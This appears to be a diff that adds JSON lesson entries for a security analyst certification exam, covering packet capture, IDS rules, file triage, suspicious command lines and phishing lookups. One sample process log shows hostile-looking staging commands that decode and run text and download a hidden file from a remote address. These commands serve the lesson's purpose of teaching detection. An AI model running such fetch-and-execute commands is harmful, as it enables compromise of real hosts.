@@ -1,0 +1,299 @@
+[
+  {
+    "id": "cs1-3-network-capture-tools",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Network tools: capture, read and detect",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "Network evidence comes in three layers. Packet capture keeps the traffic itself, connection logs keep a compact record of who talked to whom, and signature-based sensors raise an alert when traffic matches a known pattern. Each layer answers a different question.",
+      "An analyst cares because malicious activity such as command-and-control callbacks, data theft and lateral movement must cross the network. Knowing which layer to open first saves time and keeps the right evidence."
+    ],
+    "rule": [
+      "A command-line capture tool such as `tcpdump` suits servers with no graphical interface. The `-w` option writes packets to a file, `-r` reads a file back, and a filter such as `host` or `port` limits what is kept. Filters can be joined with `and`, `or` and `not`.",
+      "A graphical packet analyzer opens a saved capture for reading. Its stream-following feature reassembles one conversation into readable text, which is how an analyst sees commands, requests or transferred content, as long as it is unencrypted and so readable.",
+      "A network metadata tool turns observed traffic into structured logs per protocol, such as a connection log with source, destination, port, bytes and duration. These logs are small enough to keep for a long time and easy to search, but they are not a copy of the content of the packets (the payload).",
+      "A signature-based intrusion detection system (IDS) or intrusion prevention system (IPS) compares traffic with rules. A rule header names the action, protocol, source address and port, direction, and destination address and port. The options narrow the match, and `flow:established,to_server` limits a rule to established connections going toward the server.",
+      "The `alert` action only records a match. The `drop` action discards the packet as well, and only works when the sensor sits inline in the path of the traffic.",
+      "Read direction first. Internal to external on an unusual port suggests a host calling out. External to internal suggests scanning or an attack on a service. A regular rhythm of small connections to one address is a pattern worth chasing even when no rule fired."
+    ],
+    "example": {
+      "intro": "A hunter reviews the connection log for `ws-0412.example.internal` (`10.20.4.12`) after a threat report mentions slow, steady callbacks. No sensor alert exists for it.",
+      "table": {
+        "caption": "Connection log extract, one host, outbound sessions",
+        "head": [
+          "Time",
+          "Source",
+          "Destination",
+          "Port",
+          "Bytes out",
+          "Duration"
+        ],
+        "rows": [
+          [
+            "02:00:01",
+            "`10.20.4.12`",
+            "`198.51.100.44`",
+            "8443",
+            "412",
+            "1 s"
+          ],
+          [
+            "02:01:01",
+            "`10.20.4.12`",
+            "`198.51.100.44`",
+            "8443",
+            "409",
+            "1 s"
+          ],
+          [
+            "02:02:02",
+            "`10.20.4.12`",
+            "`198.51.100.44`",
+            "8443",
+            "415",
+            "1 s"
+          ],
+          [
+            "02:03:01",
+            "`10.20.4.12`",
+            "`198.51.100.44`",
+            "8443",
+            "410",
+            "1 s"
+          ],
+          [
+            "02:03:40",
+            "`10.20.4.12`",
+            "`192.0.2.15`",
+            "443",
+            "9120",
+            "14 s"
+          ]
+        ]
+      },
+      "steps": [
+        "The first four rows share one source, one destination and one unusual port, and they repeat about every 60 seconds with almost the same size. Human browsing is not that regular, so this looks like a beacon.",
+        "The last row goes to a different address on a common port and is larger and longer, so it looks like ordinary browsing and does not belong to the pattern.",
+        "No alert fired because the sensor only knows its rules. The metadata layer exposed the rhythm that a signature would miss.",
+        "Next step: capture traffic to `198.51.100.44` with a host filter and write it to a file, open the saved file in the packet analyzer, then follow the stream to see what is exchanged."
+      ]
+    },
+    "trap": {
+      "wrong": "If the IDS raised no alert for a host, its network traffic is clean.",
+      "why": "A signature sensor only matches patterns it already has. New or custom command-and-control traffic can pass without any alert. Connection logs and captures show behavior such as a steady beat, odd ports and odd volumes, so check them when a report points at a host."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-002",
+      "cs4-1-3-mcq-003",
+      "cs4-1-3-mcq-004",
+      "cs4-1-3-mcq-006",
+      "cs4-1-3-mcq-007"
+    ]
+  },
+  {
+    "id": "cs1-3-static-then-dynamic",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Suspicious files: static first, then dynamic",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "When a file looks suspicious, an analyst can learn about it without running it (static analysis) or by running it in a controlled place and watching it (dynamic analysis). The two are used in that order, from least access to most.",
+      "The order matters because running an unknown file is the one step that can harm a real system. Static checks are safe and often settle the question quickly, and they tell the analyst what to look for when the file is later run."
+    ],
+    "rule": [
+      "A file hash is a fingerprint. Looking it up in a reputation service needs only the hash, never the file, so it is the first and safest step. Many engines agreeing it is malicious is strong evidence.",
+      "No detections is not the same as clean. A file that no engine has seen has no verdict yet. Treat it as unknown and keep analyzing.",
+      "Extracting readable strings reads the file without running it. Addresses, file paths, command names and odd messages inside a program can show what it intends to do. A decoder tool can reveal text hidden by simple encodings.",
+      "A sandbox runs the sample (the suspicious file) in an isolated guest machine and reports what it does: files written, processes started, registry changes and network calls. This is dynamic analysis and belongs after the static steps.",
+      "Some samples wait before acting or check for signs of analysis. A short run with no activity does not prove the file is harmless. Extend the run time or speed up the guest clock, and then judge the report.",
+      "What the sandbox shows can become a detection rule, for example a rule that matches text and byte patterns in files, which is then used to search for other copies."
+    ],
+    "example": {
+      "intro": "A user forwards `update_helper.exe` from an unexpected message. The analyst works from the safest step to the most revealing.",
+      "table": {
+        "caption": "Triage notes for one file",
+        "head": [
+          "Step",
+          "Method",
+          "Result"
+        ],
+        "rows": [
+          [
+            "1",
+            "Hash lookup",
+            "A few engines flag it as a downloader; most show nothing"
+          ],
+          [
+            "2",
+            "Strings",
+            "A web address, a temp folder path and the name of a Windows Run registry key (a startup entry)"
+          ],
+          [
+            "3",
+            "Sandbox, 5 minutes",
+            "Contacts the address, writes a copy to the temp folder, sets a startup entry"
+          ],
+          [
+            "4",
+            "Rule from report",
+            "Matches the temp path text and the startup name"
+          ]
+        ]
+      },
+      "steps": [
+        "The hash result is mixed. A few flags are a lead but not a verdict, and the missing flags may only mean the sample is new.",
+        "The strings hint at download and persistence without proving either, because text in a file is only intent.",
+        "The sandbox shows the behavior directly: a callback, a dropped copy and a startup entry. That confirms the file is malicious.",
+        "The behavior becomes a rule, and the analyst uses it to search other hosts for the same copy."
+      ]
+    },
+    "trap": {
+      "wrong": "Run the file in the sandbox first, since a behavior report is the most informative step.",
+      "why": "The report is the most informative, but the cheap, safe steps often answer the question sooner and shape what to watch for. Hash and strings never execute the file. Dynamic analysis comes after them and only in an isolated guest."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-016",
+      "cs4-1-3-mcq-018",
+      "cs4-1-3-mcq-020",
+      "cs4-1-3-mcq-021"
+    ]
+  },
+  {
+    "id": "cs1-3-suspicious-command-lines",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Reading suspicious commands and scripts",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "Attackers often run commands rather than programs of their own. A command line recorded by an endpoint tool or a process log shows what ran, what started it and with what options, so it is some of the best evidence an analyst has.",
+      "The skill is to separate ordinary administration from concealment and staging (fetching and preparing code to run). Traits matter more than any one command name, and context decides the verdict."
+    ],
+    "rule": [
+      "Concealment traits: an encoded argument, a hidden window, skipped loading of the user profile (for example PowerShell's `-NoProfile` flag) and long text that is not readable. These hide what the command does from the user and from simple logs.",
+      "Staging traits: downloading text or a program from a remote address and running it at once, for example by piping the download into a shell. Whatever the server serves is executed unreviewed.",
+      "Parent and child matter. A web server process or an office program starting a shell is unusual and often the point of entry. The same shell started by an administrator at a console is normal.",
+      "Persistence shows up as scheduled jobs, startup entries and cron (the Linux task scheduler) lines that fetch or run a script repeatedly. A short interval and a remote source are the warning signs.",
+      "Decode before you conclude. A decoder tool can apply base64 (a text encoding) and other steps in order to reveal the real command. Then judge it with the account, host, time and destination, and keep the original string as evidence."
+    ],
+    "example": {
+      "intro": "A process log from `web-03.example.internal` shows a shell started by the web server account.",
+      "table": {
+        "caption": "Process log extract",
+        "head": [
+          "Time",
+          "Parent",
+          "Account",
+          "Command line"
+        ],
+        "rows": [
+          [
+            "03:12:07",
+            "httpd",
+            "www-data",
+            "sh -c \"echo <encoded text> | base64 -d | sh\""
+          ],
+          [
+            "03:12:08",
+            "sh",
+            "www-data",
+            "wget -q -O /tmp/.x http://203.0.113.9/a"
+          ],
+          [
+            "03:12:09",
+            "sh",
+            "www-data",
+            "chmod +x /tmp/.x"
+          ]
+        ]
+      },
+      "steps": [
+        "The web server account should not start a shell that decodes and runs text, so the parent and child pairing is already a concern.",
+        "Decoding the string shows it is the same download command seen on the next line, which links the two events.",
+        "A hidden file name in `/tmp` made executable is staging, and the remote address is the place to check next in firewall logs.",
+        "The analyst isolates the host, keeps the logs and the decoded string as evidence, and reviews what else the account touched."
+      ]
+    },
+    "trap": {
+      "wrong": "Because the command line looks frightening, it proves the host is compromised, so there is no need to decode or check context.",
+      "why": "Odd syntax is a lead, not proof. Administrators also use encoded or hidden commands for legitimate work. Decode the content, then check the parent process, the account, the time and the destination before calling it malicious."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-010",
+      "cs4-1-3-mcq-024",
+      "cs4-1-3-mcq-025",
+      "cs4-1-3-mcq-001"
+    ]
+  },
+  {
+    "id": "cs1-3-indicator-lookups",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Lookups for domains, addresses and mail",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "Analysts often start from a single indicator: a domain in a link, an address in a firewall log or a sender on a reported message. Public lookups add context to that indicator in seconds without touching the suspect system.",
+      "Each lookup answers one narrow question. Choosing the right one, and weighing the answer as supporting evidence rather than proof, is the skill."
+    ],
+    "rule": [
+      "A registration query (`whois`) returns the creation date, the registrar and the name servers of a domain. A domain created days ago and used in a link to log in is a strong phishing hint.",
+      "A reputation service for addresses, domains and hashes pools reports from many sources. A high score with many recent reports justifies a block and a closer look at local logs. It does not prove that an internal host is infected, and it never replaces the local logs.",
+      "A community platform for sharing indicator collections lets an analyst see what others have published about an indicator and publish their own.",
+      "Mail headers show how a message really traveled. A failed Sender Policy Framework (SPF) check, or a Return-Path domain that differs from the From domain, suggests a forged sender. Judge it together with the domain age and the other checks, since mailing services and forwarders also cause mismatches. Normal relays, attachments and send times alone prove nothing.",
+      "A Domain-based Message Authentication, Reporting and Conformance (DMARC) record published by the sender's domain tells receivers what to do when SPF and DomainKeys Identified Mail (DKIM) checks fail, such as none, quarantine or reject. Mail lookup sites show these records and blocklist status together."
+    ],
+    "example": {
+      "intro": "A user reports a message claiming to be from a supplier and asking for updated bank details. The analyst gathers four quick checks about the sender domain.",
+      "table": {
+        "caption": "Lookup results for the sender domain",
+        "head": [
+          "Check",
+          "Result"
+        ],
+        "rows": [
+          [
+            "Registration",
+            "Created three days ago"
+          ],
+          [
+            "SPF for the sending server",
+            "Fail"
+          ],
+          [
+            "Reputation of the sending address",
+            "No reports"
+          ],
+          [
+            "Return-Path versus From",
+            "Different domains"
+          ]
+        ]
+      },
+      "steps": [
+        "The new registration and the failed SPF check both point to a forged or spoofed sender rather than a mailing service the supplier uses.",
+        "The Return-Path mismatch supports the forged-sender reading, though on its own it is weak because mailing services and forwarders also cause it.",
+        "The lack of reports is expected for a brand-new sender and does not weaken the case.",
+        "The analyst blocks the domain, searches the mail logs for other recipients and warns the finance team to verify bank changes by phone."
+      ]
+    },
+    "trap": {
+      "wrong": "The address has no reports in the reputation service, so the sender must be legitimate.",
+      "why": "Reputation is built from past reports, so a new indicator has none. Silence means unknown, not safe. Use other facts, such as domain age, authentication results and header mismatches, to decide."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-014",
+      "cs4-1-3-mcq-015",
+      "cs4-1-3-mcq-026",
+      "cs4-1-3-mcq-033",
+      "cs4-1-3-mcq-011"
+    ]
+  }
+]
